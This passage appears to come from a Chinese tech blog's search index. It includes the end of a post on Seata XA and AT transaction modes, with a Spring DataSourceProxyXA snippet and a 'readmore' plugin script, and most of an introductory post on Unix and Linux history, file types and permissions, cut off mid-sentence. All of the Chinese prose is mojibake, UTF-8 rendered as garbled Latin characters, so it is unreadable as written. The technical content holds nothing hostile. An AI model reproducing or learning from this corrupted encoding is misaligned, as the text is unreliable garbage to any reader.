æ¨¡å¼åœ¨æœ¬åœ°äº‹åŠ¡æäº¤ä¹‹å‰æ‰æ³¨å†Œåˆ†æ”¯ï¼Œé¿å…åˆ†æ”¯æ‰§è¡Œå¤±è´¥æƒ…å†µä¸‹ï¼Œæ²¡æœ‰æ„ä¹‰çš„åˆ†æ”¯æ³¨å†Œã€‚è¿™ä¸ªä¼˜åŒ–æ–¹å‘éœ€è¦ BranchId ç”Ÿæˆæœºåˆ¶çš„å˜åŒ–æ¥é…åˆï¼Œå³ BranchId ä¸é€šè¿‡åˆ†æ”¯æ³¨å†Œè¿‡ç¨‹ç”Ÿæˆï¼Œè€Œæ˜¯ç”Ÿæˆåå†å¸¦ç€ BranchId å»æ³¨å†Œåˆ†æ”¯ã€‚ XA æ¨¡å¼çš„ä½¿ç”¨ï¼š ä»ç¼–ç¨‹æ¨¡å‹ä¸Šï¼ŒXA æ¨¡å¼ä¸ AT æ¨¡å¼ä¿æŒå®Œå…¨ä¸€è‡´ï¼Œåªéœ€è¦ä¿®æ”¹æ•°æ®æºä»£ç†ï¼Œå³å¯å®ç° XA æ¨¡å¼ä¸ AT æ¨¡å¼ä¹‹é—´çš„åˆ‡æ¢ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678@Bean("dataSource") public DataSource dataSource(DruidDataSource druidDataSource) { // DataSourceProxy for AT mode // return new DataSourceProxy(druidDataSource); // DataSourceProxyXA for XA mode return new DataSourceProxyXA(druidDataSource); } 6ã€å‚è€ƒæ–‡çŒ® Seata å®˜æ–¹æ–‡æ¡£ - AT æ¨¡å¼ Seata å®˜æ–¹æ–‡æ¡£ - XA æ¨¡å¼ Seata å®˜æ–¹æ–‡æ¡£ - TCC æ¨¡å¼ Seata å®˜æ–¹æ–‡æ¡£ - Saga æ¨¡å¼ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ åˆ†å¸ƒå¼"},{title:"Linux ç³»ç»Ÿç¼–ç¨‹ä¹‹ä¸€ Unixã€Linux æ“ä½œç³»ç»Ÿä»‹ç»",url:"/posts/429c103b.html",text:'æ“ä½œç³»ç»Ÿçš„ä½œç”¨ æ–¹ä¾¿ï¼šä½¿è®¡ç®—æœºç³»ç»Ÿæ˜“äºä½¿ç”¨ æœ‰æ•ˆï¼šä»¥æ›´æœ‰æ•ˆçš„æ–¹å¼ä½¿ç”¨è®¡ç®—æœºç³»ç»Ÿèµ„æº æ‰©å±•ï¼šæ–¹ä¾¿ç”¨æˆ·æœ‰æ•ˆå¼€å‘ã€æµ‹è¯•å’Œå¼•è¿›æ–°åŠŸèƒ½ æ“ä½œç³»ç»Ÿçš„åœ°ä½æ“ä½œç³»ç»Ÿåœ¨è®¡ç®—æœºç³»ç»Ÿä¸­æ‰¿ä¸Šå¯ä¸‹çš„åœ°ä½ï¼šå‘ä¸‹å°è£…ç¡¬ä»¶ï¼Œå‘ä¸Šæä¾›æ“ä½œæ¥å£ã€‚ Unix/Linux ä»‹ç»Unix å®¶æ—å² 1965ï¼šè´å°”å®éªŒå®¤ï¼ˆBell Labsï¼‰åŠ å…¥ä¸€é¡¹ç”±é€šç”¨ç”µæ°”å’Œéº»çœç†å·¥å­¦é™¢åˆä½œçš„è®¡åˆ’ï¼Œè¯¥è®¡åˆ’è¦å»ºç«‹ä¸€å¥—å¤šä½¿ç”¨è€…ã€å¤šä»»åŠ¡ã€å¤šå±‚æ¬¡çš„ MULTICS æ“ä½œç³»ç»Ÿï¼Œåæ¥å› ä¸ºé¡¹ç›®å¤ªä¸ºå¤æ‚å¤±è´¥ 1969ï¼šå…¶ä¸»è¦å¼€å‘è€… Thompsonï¼ˆåè¢«ç§°ä¸º Unix ä¹‹çˆ¶ï¼‰å’Œ Ritchie é¢†å¯¼ä¸€ç»„å¼€å‘è€…ï¼Œå¼€å‘äº†ä¸€ä¸ªæ–°çš„å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿ â€” UNICSï¼Œåæ¥è¢«æ”¹åä¸º Unixï¼Œæœ€åˆçš„ Unix æ˜¯ç”¨ B è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€æ··åˆç¼–å†™è€Œæˆ 1971ï¼šä¸¤äººåœ¨è´å°”å®éªŒå®¤å…±åŒå‘æ˜äº† C è¯­è¨€ï¼Œå¹¶äº 1973 ç”¨ C è¯­è¨€é‡å†™äº† Unix 1974ï¼šUnix ç¬¬ä¸€æ¬¡å‡ºç°åœ¨è´å°”å®éªŒå®¤ä»¥å¤–ã€‚æ­¤å Unix è¢«æ”¿åºœæœºå…³ï¼Œç ”ç©¶æœºæ„ï¼Œä¼ä¸šå’Œå¤§å­¦æ³¨æ„åˆ°ï¼Œå¹¶é€æ¸æµè¡Œå¼€æ¥ 1980ï¼šæœ‰ä¸¤ä¸ªæœ€ä¸»è¦çš„ Unix çš„ç‰ˆæœ¬çº¿ï¼Œä¸€ä¸ªæ˜¯ Berkeley çš„ BSD Unixï¼Œå¦ä¸€ä¸ªæ˜¯ AT&amp;T çš„ Unixï¼Œä¸¤è€…çš„ç«äº‰æœ€ç»ˆå¼•å‘äº† Unix çš„æˆ˜äº‰ï¼Œæœ€ç»ˆå¯¼è‡´ Unix å‡ºç°å„ç§å„æ ·çš„å˜ç§ç‰ˆæœ¬ 1982ï¼šAT&amp;T åŸºäºç‰ˆæœ¬ 7 å¼€å‘äº† Unix System â…¢ çš„ç¬¬ä¸€ä¸ªå•†ä¸šç‰ˆæœ¬ï¼Œå¹¶ä¸å†å¼€æº 1992~2001ï¼šç”±äºç‰ˆæƒé—®é¢˜ï¼ŒAT&amp;T å…¬å¸ä¸ BSD å¼€å‘ç»„å¼€å§‹äº†ä¸€åœºå°†è¿‘ 10 å¹´çš„ç‰ˆæƒå®˜å¸ã€‚Unix ç”±äºå…¶æ˜‚è´µçš„è´¹ç”¨ï¼Œä»…å±€é™äºå¤§å‹æœºçš„åº”ç”¨ï¼›BSD å› ä¸ºç‰ˆæƒé—®é¢˜ï¼Œå¤±å»äº†å®è´µçš„å‘å±•æ—¶æœŸ Linux å®¶æ—å² Minixï¼ˆmini-Unixï¼‰æœ€åˆæ˜¯ç”± Andrew Tanenbaum æ•™æˆï¼Œä»¿ç…§ 4.3 BSD çš„æºä»£ç ï¼Œç™½æ‰‹èµ·å®¶å®Œæˆäº† 12000 è¡Œ C è¯­è¨€çš„ç¼–å†™å·¥ä½œï¼Œè¿™ä¸ªç³»ç»Ÿåªæ˜¯ä¸€ä¸ªæ•™å­¦å·¥å…·ï¼Œæ²¡æœ‰ä»€ä¹ˆå®é™…åº”ç”¨ä»·å€¼ 1990 å¹´ï¼ŒLinus Torvalds å†³å®šç¼–å†™ä¸€ä¸ªè‡ªå·±çš„ Minix å†…æ ¸ï¼Œåˆåä¸º Linus\' Minixï¼Œæ„ä¸º Linus çš„ Minix å†…æ ¸ï¼Œåæ¥æ”¹åä¸º Linuxï¼Œæ­¤å†…æ ¸äº 1991 å¹´æ­£å¼å‘å¸ƒï¼Œå¹¶é€æ¸å¼•èµ·äººä»¬çš„æ³¨æ„ Linux æ“ä½œç³»ç»Ÿçš„è¯ç”Ÿã€å‘å±•ã€å’Œæˆé•¿è¿‡ç¨‹ä¾èµ–äºäº”ä¸ªé‡è¦æ”¯æŸ±ï¼šUnix æ“ä½œç³»ç»Ÿã€Minix æ“ä½œç³»ç»Ÿã€GNU è®¡åˆ’ã€POSIX æ ‡å‡†å’Œäº’è”ç½‘ GNU è®¡åˆ’ï¼šGNU æ˜¯ GNU is Not Unix çš„é€’å½’ç¼©å†™ï¼Œç”± Richard M.Stallman äº 1984 å¹´åˆ›åŠï¼Œæ—¨åœ¨å¼€å‘ä¸€ä¸ªå…è´¹ã€ç±» Unix çš„æ“ä½œç³»ç»Ÿ ã€‚GNU ç³»ç»ŸåŠå…¶å¼€å‘å·¥å…·åŒ…æ‹¬ï¼šEmacs ç¼–è¾‘ç³»ç»Ÿã€BASH Shell ç¨‹åºã€GCCã€GDB ç­‰ï¼Œè¿™äº›å¼€å‘å·¥å…·éƒ½æ˜¯ GNU ç»„ç»‡çš„äº§å“ 1992 å¹´ Linux ä¸å…¶ä»– GNU è½¯ä»¶ç»“åˆï¼Œå®Œå…¨è‡ªç”±çš„æ“ä½œç³»ç»Ÿæ­£å¼è¯ç”Ÿã€‚è¯¥æ“ä½œç³»ç»Ÿå¾€å¾€è¢«ç§°ä¸º GNU/Linux æˆ–ç®€ç§° Linux POSIX æ ‡å‡†ï¼šPOSIX æ ‡å‡†å®šä¹‰äº†æ“ä½œç³»ç»Ÿåº”è¯¥ä¸ºåº”ç”¨ç¨‹åºæä¾›çš„æ¥å£æ ‡å‡†ï¼ŒPOSIX æ ‡å‡†ç”¨æ¥ç»Ÿä¸€ Unixã€Linux å„åˆ†æ”¯ç¼–ç¨‹æ¥å£ï¼Œä»¥æé«˜å…¶é€šç”¨å‹å’Œå¯ç§»æ¤æ€§ Linux çš„è¿œäº² Linux çš„ä¸¤ç±»ç”¨æˆ· Linux å’Œ Unix çš„è”ç³» Unix ç³»ç»Ÿæ˜¯å·¥ä½œç«™ä¸Šæœ€å¸¸ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œå®ƒæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·ã€å¤šä»»åŠ¡çš„å®æ—¶æ“ä½œç³»ç»Ÿï¼Œå…è®¸å¤šäººåŒæ—¶è®¿é—®è®¡ç®—æœºï¼Œå¹¶åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡ã€‚Unix ç³»ç»Ÿå…·æœ‰ç¨³å®šã€é«˜æ•ˆã€å®‰å…¨ã€æ–¹ä¾¿ã€åŠŸèƒ½å¼ºå¤§ç­‰è¯¸å¤šä¼˜ç‚¹ï¼Œè‡ª 20 ä¸–çºª 70 å¹´ä»£å¼€å§‹ä¾¿è¿è¡Œåœ¨è®¸å¤šå¤§å‹å’Œå°å‹è®¡ç®—æœºä¸Š Unix è™½ç„¶æ˜¯ä¸€ä¸ªå®‰å…¨ã€ç¨³å®šä¸”åŠŸèƒ½å¼ºå¤§çš„æ“ä½œç³»ç»Ÿï¼Œä½†å®ƒä¹Ÿä¸€ç›´æ˜¯ä¸€ç§å¤§å‹çš„è€Œä¸”å¯¹è¿è¡Œå¹³å°è¦æ±‚å¾ˆé«˜çš„æ“ä½œç³»ç»Ÿï¼Œåªèƒ½åœ¨å·¥ä½œç«™æˆ–å°å‹æœºä¸Šæ‰èƒ½å‘æŒ¥å…¨éƒ¨åŠŸèƒ½ï¼Œå¹¶ä¸”ä»·æ ¼æ˜‚è´µï¼Œå¯¹æ™®é€šç”¨æˆ·æ¥è¯´æ˜¯å¯æœ›è€Œä¸å¯åŠçš„ï¼Œè¿™ä¸ºåæ¥ Linux çš„å´›èµ·æä¾›äº†æœºä¼šï¼ŒLinux æ˜¯ä¸€ä¸ªç±» Unix æ“ä½œç³»ç»Ÿ Linux æ˜¯å…è´¹çš„ã€ä¸å—ç‰ˆæƒåˆ¶çº¦ã€ä¸ Unix å…¼å®¹çš„æ“ä½œç³»ç»Ÿ Linux åœ¨ x86 æ¶æ„ä¸Šå®ç°äº† Unix ç³»ç»Ÿçš„å…¨éƒ¨ç‰¹æ€§ï¼Œå…·æœ‰å¤šç”¨æˆ·å¤šä»»åŠ¡çš„èƒ½åŠ›ï¼ŒåŒæ—¶ä¿æŒäº†é«˜æ•ˆæ€§å’Œç¨³å®šæ€§ï¼ŒLinux å…·æœ‰å¦‚ä¸‹ä¼˜ç§€çš„ç‰¹ç‚¹ï¼š å¼€æ”¾æ€§ å®Œå…¨å…è´¹ å¤šç”¨æˆ· å¤šä»»åŠ¡ è‰¯å¥½çš„ç”¨æˆ·ç•Œé¢ è®¾å¤‡ç‹¬ç«‹æ€§ æä¾›äº†ä¸°å¯Œçš„ç½‘ç»œåŠŸèƒ½ å¯é çš„ç³»ç»Ÿå®‰å…¨æ€§ è‰¯å¥½çš„å¯ç§»æ¤æ€§ Linux å†…æ ¸åŠå‘è¡Œç‰ˆLinux å†…æ ¸ç‰ˆæœ¬å†…æ ¸ï¼ˆKernelï¼‰æ˜¯ç³»ç»Ÿçš„å¿ƒè„ï¼Œæ˜¯è¿è¡Œç¨‹åºå’Œç®¡ç†åƒç£ç›˜å’Œæ‰“å°æœºç­‰ç¡¬ä»¶è®¾å¤‡çš„æ ¸å¿ƒç¨‹åºï¼Œå®ƒæä¾›äº†ä¸€ä¸ªåœ¨è£¸è®¾å¤‡ä¸åº”ç”¨ç¨‹åºé—´çš„æŠ½è±¡å±‚ã€‚Linux å†…æ ¸æºç çš„å®˜ç½‘ï¼šhttps://www.kernel.orgï¼Œæ‰€æœ‰æ¥è‡ªå…¨ä¸–ç•Œçš„å¯¹ Linux æºç çš„ä¿®æ”¹æœ€ç»ˆéƒ½ä¼šæ±‡æ€»åˆ°è¿™ä¸ªç½‘ç«™ï¼Œç”± Linus é¢†å¯¼çš„å¼€æºç¤¾åŒºå¯¹å…¶è¿›è¡Œç”„åˆ«å’Œä¿®æ”¹ï¼Œæœ€ç»ˆå†³å®šæ˜¯å¦è¿›å…¥åˆ° Linux ä¸»çº¿å†…æ ¸æºç ä¸­ã€‚Linux å†…æ ¸ç‰ˆæœ¬åˆåˆ†ä¸ºç¨³å®šç‰ˆå’Œå¼€å‘ç‰ˆï¼Œä¸¤ç§ç‰ˆæœ¬æ˜¯ç›¸äº’å…³è”ï¼Œç›¸äº’å¾ªç¯ï¼š ç¨³å®šç‰ˆï¼šå…·æœ‰å·¥ä¸šçº§å¼ºåº¦ï¼Œå¯ä»¥å¹¿æ³›åœ°åº”ç”¨å’Œéƒ¨ç½²ã€‚æ–°çš„ç¨³å®šç‰ˆç›¸å¯¹äºè¾ƒæ—§çš„åªæ˜¯ä¿®æ­£ä¸€äº› Bug æˆ–åŠ å…¥ä¸€äº›æ–°çš„é©±åŠ¨ç¨‹åº å¼€å‘ç‰ˆï¼šç”±äºè¦è¯•éªŒå„ç§è§£å†³æ–¹æ¡ˆï¼Œæ‰€ä»¥å˜åŒ–å¾ˆå¿« Linux å‘è¡Œç‰ˆæœ¬Linux å‘è¡Œç‰ˆ (ä¹Ÿè¢«å«åš GNU/Linux å‘è¡Œç‰ˆ) é€šå¸¸åŒ…å«äº†åŒ…æ‹¬æ¡Œé¢ç¯å¢ƒã€åŠå…¬å¥—ä»¶ã€åª’ä½“æ’­æ”¾å™¨ã€æ•°æ®åº“ç­‰åº”ç”¨è½¯ä»¶ã€‚è¿™äº›æ“ä½œç³»ç»Ÿé€šå¸¸ç”± Linux å†…æ ¸ã€ä»¥åŠæ¥è‡ª GNU è®¡åˆ’çš„å¤§é‡çš„å‡½å¼åº“å’ŒåŸºäº X Window çš„å›¾å½¢ç•Œé¢ç»„æˆï¼Œåœ¨ X Window ä¸­ç”¨æˆ·åŒæ ·å¯ä»¥é€šè¿‡ä½¿ç”¨é¼ æ ‡å¯¹çª—å£ã€èœå•ç­‰è¿›è¡Œæ“ä½œæ¥å®Œæˆç›¸åº”çš„å·¥ä½œã€‚X Window ç³»ç»Ÿæ˜¯ä¸€ä¸ªéå¸¸å‡ºè‰²çš„å›¾å½¢çª—å£ç³»ç»Ÿï¼Œæ˜¯ç±» UNIX ç³»ç»Ÿçš„å›¾å½¢ç”¨æˆ·ç•Œé¢çš„å·¥ä¸šæ ‡å‡†ï¼Œå…¶æœ€é‡è¦çš„ç‰¹å¾ä¹‹ä¸€å°±æ˜¯å®ƒçš„ç»“æ„ä¸è®¾å¤‡æ— å…³ã€‚X Window ç³»ç»Ÿçš„ä¸»è¦ç‰¹ç‚¹å¦‚ä¸‹ï¼š X Window ç³»ç»Ÿæ˜¯å®¢æˆ·ç«¯ / æœåŠ¡ç«¯æ¶æ„çš„ï¼Œå®ƒçš„å®ç°æ˜¯ä¸æ“ä½œç³»ç»Ÿå†…æ ¸åˆ†å¼€çš„ï¼Œå…¶ä¸»è¦ç”± X Server å’Œ X Client ä¸¤éƒ¨åˆ†ç»„æˆ X Window ç³»ç»Ÿä¸æ˜¯ Unix/Linux æ“ä½œç³»ç»Ÿçš„å¿…é¡»çš„æ„æˆéƒ¨åˆ†ï¼Œè€Œåªæ˜¯ä¸€ä¸ªå¯é€‰çš„åº”ç”¨ç¨‹åºç»„ä»¶ é™„ï¼š2014 å¹´ä¸ 2015 å¹´æœ€æµè¡Œçš„ Linux å‘è¡Œç‰ˆçš„æ’è¡Œæ¦œå¦‚ä¸‹ï¼š POSITION 2015 2014 1 Linux Mint Linux Mint 2 Debian Ubuntu 3 Ubuntu Debian 4 openSUSE openSUSE 5 Fedora Fedora 6 Mageia Mageia 7 Manjaro Arch 8 CentOS Elementary 9 Arch CentOS 10 Elementary Zorin Unix/Linux å¼€å‘åº”ç”¨é¢†åŸŸ Unix/LinuxæœåŠ¡å™¨ï¼šæ˜¯ç›®å‰ Unix/Linux åº”ç”¨æœ€å¤šçš„ä¸€ä¸ªé¢†åŸŸï¼Œå¯ä»¥æä¾› Webã€FTPã€Gopherã€SMTP/POP3ã€Proxy/Cacheã€DNS ç­‰æœåŠ¡å™¨ï¼Œæ”¯æŒæœåŠ¡å™¨é›†ç¾¤ï¼Œæ”¯æŒè™šæ‹Ÿä¸»æœºã€è™šæ‹ŸæœåŠ¡ç­‰ã€‚ åµŒå…¥å¼ Linux ç³»ç»Ÿï¼šåµŒå…¥å¼ Linux æ˜¯å°†æµè¡Œçš„ Linux æ“ä½œç³»ç»Ÿè¿›è¡Œå‰ªè£ä¿®æ”¹ï¼Œèƒ½å¤Ÿåœ¨åµŒå…¥å¼è®¡ç®—æœºç³»ç»Ÿä¸Šè¿è¡Œçš„ä¸€ç§æ“ä½œç³»ç»Ÿã€‚Linux åµŒå…¥å¼ç³»ç»Ÿèƒ½å¤Ÿæ”¯æŒå¤šç§ CPU å’Œç¡¬ä»¶å¹³å°ï¼Œæ€§èƒ½ç¨³å®šï¼Œå‰ªè£æ€§å¥½ï¼Œå¼€å‘å’Œä½¿ç”¨å®¹æ˜“ï¼Œå…¶ä¸­åŒ…æ‹¬ Embedixã€uCLinuxã€muLinux ç­‰ã€‚ æ¡Œé¢åº”ç”¨ï¼šè¿‘å¹´æ¥ï¼ŒLinux ç³»ç»Ÿç‰¹åˆ«å¼ºè°ƒåœ¨æ¡Œé¢åº”ç”¨æ–¹é¢çš„æ”¹è¿›ï¼Œç›®å‰å·²ç»å®Œå…¨å¯ä»¥ä½œä¸ºä¸€ç§é›†åŠå…¬åº”ç”¨ã€å¤šåª’ä½“åº”ç”¨ã€ç½‘ç»œåº”ç”¨ç­‰å¤šæ–¹é¢åŠŸèƒ½äºä¸€ä½“çš„å›¾å½¢ç•Œé¢æ“ä½œç³»ç»Ÿï¼Œåœ¨åŠå…¬åº”ç”¨æ–¹é¢ï¼ŒUnix/Linux é›†æˆäº† OpenOfficeã€SUN å…¬å¸çš„ StarOffice ä»¥åŠ KOffice ç­‰å·¥å…·ã€‚ ç”µå­æ”¿åŠ¡ï¼šéšç€ Linux çš„å¿«é€Ÿå‘å±•ï¼ŒLinux å·²é€æ¸æˆä¸º Windows ç³»ç»Ÿé‡è¦çš„ç«äº‰åŠ›é‡ã€‚å°¤å…¶æ˜¯ Linux åœ¨å®‰å…¨æ€§æ–¹é¢çš„ç‹¬ç‰¹ä¼˜åŠ¿ï¼Œåˆä½¿å¾— Linux åœ¨æ”¿åºœåº”ç”¨é¢†åŸŸå¾—åˆ°å¾ˆå¤§çš„å‘å±•ã€‚ç›®å‰ä¸€äº›å›½å®¶æ­£å°†å…¶ç”µå­æ”¿åŠ¡ç³»ç»Ÿå‘ Linux å¹³å°è¿ç§»ã€‚ä¸­å›½æ”¿åºœä¹Ÿå¯¹ Linux ç»™äºˆæå¤§çš„æ”¯æŒã€‚ Linux æ–‡ä»¶ç³»ç»Ÿç›®å½• ç›®å½•æ˜¯ä¸€ç»„ç›¸å…³æ–‡ä»¶çš„é›†åˆ ä¸€ä¸ªç›®å½•ä¸‹é¢é™¤äº†å¯ä»¥å­˜æ”¾æ–‡ä»¶ä¹‹å¤–è¿˜å¯ä»¥å­˜æ”¾å…¶ä»–ç›®å½•ï¼Œå³å¯åŒ…å«å­ç›®å½• åœ¨ç¡®å®šæ–‡ä»¶ã€ç›®å½•ä½ç½®æ—¶ï¼ŒDOS å’Œ Unix/Linux éƒ½é‡‡ç”¨ è·¯å¾„å + æ–‡ä»¶å çš„æ–¹å¼ï¼Œè·¯å¾„åæ˜ çš„æ˜¯ç›®å½•ä¸ç›®å½•ä¹‹é—´çš„å…³ç³» è·¯å¾„Unix/Linux è·¯å¾„ç”±åˆ°è¾¾å®šä½æ–‡ä»¶çš„ç›®å½•ç»„æˆã€‚åœ¨ Unix/Linux ç³»ç»Ÿä¸­ç»„æˆè·¯å¾„çš„ç›®å½•åˆ†å‰²ç¬¦ä¸ºæ–œæ  /ï¼Œè€Œ DOS åˆ™ç”¨åæ–œæ  â€˜` æ¥åˆ†å‰²å„ä¸ªç›®å½•ã€‚è·¯å¾„åˆ†ä¸ºç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ï¼š ç»å¯¹è·¯å¾„ ç»å¯¹è·¯å¾„æ˜¯ä»ç›®å½•æ ‘çš„æ ‘æ ¹ / ç›®å½•å¼€å§‹å¾€ä¸‹ç›´è‡³åˆ°è¾¾æ–‡ä»¶æ‰€ç»è¿‡çš„æ‰€æœ‰èŠ‚ç‚¹ç›®å½• ä¸‹çº§ç›®å½•æ¥åœ¨ä¸Šçº§ç›®å½•åé¢ç”¨ / éš”å¼€ ç»å¯¹è·¯å¾„éƒ½æ˜¯ä» / å¼€å§‹çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸€å®šæ˜¯ / ç›¸å¯¹è·¯å¾„ ç›¸å¯¹è·¯å¾„æ˜¯æŒ‡ç›®æ ‡ç›®å½•ç›¸å¯¹äºå½“å‰ç›®å½•çš„ä½ç½® å¦‚æœä¸åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåˆ™éœ€è¦ä½¿ç”¨ä¸¤ä¸ªç‰¹æ®Šç›®å½• . å’Œ .. äº†ï¼Œè¿™é‡Œçš„ç›®å½• . æŒ‡å‘å½“å‰ç›®å½•ï¼Œè€Œç›®å½• .. æŒ‡å‘ä¸Šçº§ç›®å½• ä¸€åˆ‡çš†æ–‡ä»¶Unix/Linux å¯¹æ•°æ®æ–‡ä»¶ï¼ˆ.mp3ã€.bmpï¼‰ï¼Œç¨‹åºæ–‡ä»¶ï¼ˆ.cã€.hã€.oï¼‰ï¼Œè®¾å¤‡æ–‡ä»¶ï¼ˆLCDã€è§¦æ‘¸å±ã€é¼ æ ‡ï¼‰ï¼Œç½‘ç»œæ–‡ä»¶ï¼ˆSocketï¼‰ç­‰çš„ç®¡ç†éƒ½æŠ½è±¡ä¸ºæ–‡ä»¶ï¼Œä½¿ç”¨ç»Ÿä¸€çš„æ–¹å¼æ–¹æ³•ç®¡ç†ã€‚åœ¨ Unix/Linux æ“ä½œç³»ç»Ÿä¸­ä¹Ÿå¿…é¡»åŒºåˆ†æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡æ–‡ä»¶ç±»å‹å¯ä»¥åˆ¤æ–­æ–‡ä»¶å±äºå¯æ‰§è¡Œæ–‡ä»¶ã€æ–‡æœ¬æ–‡ä»¶è¿˜æ˜¯æ•°æ®æ–‡ä»¶ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ Unix/Linux ç³»ç»Ÿä¸­æ–‡ä»¶å¯ä»¥æ²¡æœ‰æ‰©å±•åï¼Œæ–‡ä»¶ååŒºåˆ†å¤§å°å†™ã€‚ æ–‡ä»¶çš„ç±»å‹é€šå¸¸ï¼ŒUnix/Linux ç³»ç»Ÿä¸­å¸¸ç”¨çš„æ–‡ä»¶ç±»å‹æœ‰ 5 ç§ï¼šæ™®é€šæ–‡ä»¶ã€ç›®å½•æ–‡ä»¶ã€è®¾å¤‡æ–‡ä»¶ã€ç®¡é“æ–‡ä»¶å’Œé“¾æ¥æ–‡ä»¶ã€‚ æ™®é€šæ–‡ä»¶ï¼šæ™®é€šæ–‡ä»¶æ˜¯è®¡ç®—æœºæ“ä½œç³»ç»Ÿç”¨äºå­˜æ”¾æ•°æ®ã€ç¨‹åºç­‰ä¿¡æ¯çš„æ–‡ä»¶ï¼Œä¸€èˆ¬éƒ½é•¿æœŸå­˜æ”¾äºå¤–å­˜å‚¨å™¨ï¼ˆç£ç›˜ã€ç£å¸¦ç­‰ï¼‰ä¸­ã€‚æ™®é€šæ–‡ä»¶ä¸€èˆ¬åŒ…æ‹¬æ–‡æœ¬æ–‡ä»¶ã€æ•°æ®æ–‡ä»¶ã€å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶ç­‰ ç›®å½•æ–‡ä»¶ï¼šUnix/Linux ç³»ç»ŸæŠŠç›®å½•çœ‹æˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œåˆ©ç”¨å®ƒæ„æˆæ–‡ä»¶ç³»ç»Ÿçš„æ ‘å‹ç»“æ„ï¼Œæ¯ä¸ªç›®å½•æ–‡ä»¶è‡³å°‘åŒ…æ‹¬ä¸¤ä¸ªæ¡ç›®ï¼Œ.. è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ï¼Œ. è¡¨ç¤ºè¯¥ç›®å½•æœ¬èº« é“¾æ¥æ–‡ä»¶ï¼šä¼¼äº Windows ä¸‹çš„å¿«æ·æ–¹å¼ï¼Œé“¾æ¥åˆå¯ä»¥åˆ†ä¸ºè½¯é“¾æ¥ï¼ˆç¬¦å·é“¾æ¥ï¼‰å’Œç¡¬é“¾æ¥ ç®¡é“æ–‡ä»¶ï¼šç®¡é“æ–‡ä»¶ä¹Ÿæ˜¯ Unix/Linux ä¸­è¾ƒç‰¹æ®Šçš„æ–‡ä»¶ç±»å‹ï¼Œè¿™ç±»æ–‡ä»¶å¤šç”¨äºè¿›ç¨‹é—´çš„é€šä¿¡ è®¾å¤‡æ–‡ä»¶ï¼šUnix/Linux ç³»ç»ŸæŠŠæ¯ä¸ªè®¾å¤‡éƒ½æ˜ å°„æˆä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™å°±æ˜¯è®¾å¤‡æ–‡ä»¶ã€‚å®ƒæ˜¯ç”¨äºå‘ I/O è®¾å¤‡æä¾›è¿æ¥çš„ä¸€ç§æ–‡ä»¶ï¼Œåˆ†ä¸ºå­—ç¬¦è®¾å¤‡å’Œå—è®¾å¤‡æ–‡ä»¶ã€‚å­—ç¬¦è®¾å¤‡çš„å­˜å–ä»¥ä¸€ä¸ªå­—ç¬¦ä¸ºå•ä½ï¼Œå—è®¾å¤‡çš„å­˜å–ä»¥å­—ç¬¦å—ä¸ºå•ä½ã€‚æ¯ä¸€ç§ I/O è®¾å¤‡å¯¹åº”ä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ï¼Œå­˜æ”¾åœ¨ /dev ç›®å½•ä¸­ æ–‡ä»¶çš„æƒé™æ–‡ä»¶æƒé™å°±æ˜¯æ–‡ä»¶çš„è®¿é—®æ§åˆ¶æƒé™ï¼Œå³å“ªäº›ç”¨æˆ·å’Œç»„ç¾¤å¯ä»¥è®¿é—®æ–‡ä»¶ä»¥åŠå¯ä»¥æ‰§è¡Œä»€ä¹ˆæ ·çš„æ“ä½œã€‚Unix/Linux ç³»ç»Ÿæ˜¯ä¸€ä¸ªå…¸å‹çš„å¤šç”¨æˆ·ç³»ç»Ÿï¼Œä¸åŒçš„ç”¨æˆ·å¤„äºä¸åŒçš„åœ°ä½ï¼Œå¯¹æ–‡ä»¶å’Œç›®å½•æœ‰ä¸åŒçš„è®¿é—®æƒé™ã€‚ä¸ºäº†ä¿æŠ¤ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼ŒUnix/Linux ç³»ç»Ÿé™¤äº†å¯¹ç”¨æˆ·æƒé™ä½œäº†ä¸¥æ ¼çš„ç•Œå®šå¤–ï¼Œè¿˜åœ¨ç”¨æˆ·èº«ä»½è®¤è¯ã€è®¿é—®æ§åˆ¶ã€ä¼ è¾“å®‰å…¨ã€æ–‡ä»¶è¯»å†™æƒé™ç­‰æ–¹é¢ä½œäº†å‘¨å¯†çš„æ§åˆ¶ã€‚åœ¨ Unix/Linux ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•éƒ½åŒ…å«æœ‰è®¿é—®æƒé™ï¼Œè¿™äº›è®¿é—®æƒé™å†³å®šäº†è°èƒ½è®¿é—®å’Œå¦‚ä½•è®¿é—®è¿™äº›æ–‡ä»¶å’Œç›®å½•ã€‚ è®¿é—®ç”¨æˆ·é€šè¿‡è®¾å®šæƒé™å¯ä»¥ä»ä»¥ä¸‹ä¸‰ç§è®¿é—®æ–¹å¼é™åˆ¶è®¿é—®æƒé™ï¼š 